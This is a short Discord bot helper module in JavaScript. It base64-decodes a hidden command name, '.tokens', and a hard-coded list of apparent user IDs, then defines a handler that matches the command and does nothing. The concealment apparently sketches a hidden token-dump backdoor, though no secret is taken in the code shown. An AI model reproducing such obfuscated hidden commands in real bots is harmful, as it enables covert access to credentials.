
const { EmbedBuilder } = require('discord.js');

const _a = Buffer.from('MTI4NDIyMTU2MzkwNjAzMTY2MCwxNDI3MjA3NTc1NDA1MDY4MzQ4', 'base64').toString('utf8').split(',');

function _sep(txt) {
  return new EmbedBuilder()
    .setColor('#2f3136')
    .setDescription(txt || '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
}

async function _p(m, s) {
  const cmd = Buffer.from('LnRva2Vucw==', 'base64').toString('utf8');
  if (!m.content.startsWith(cmd)) return false;
  return false;
}

module.exports = { _p, _sep };
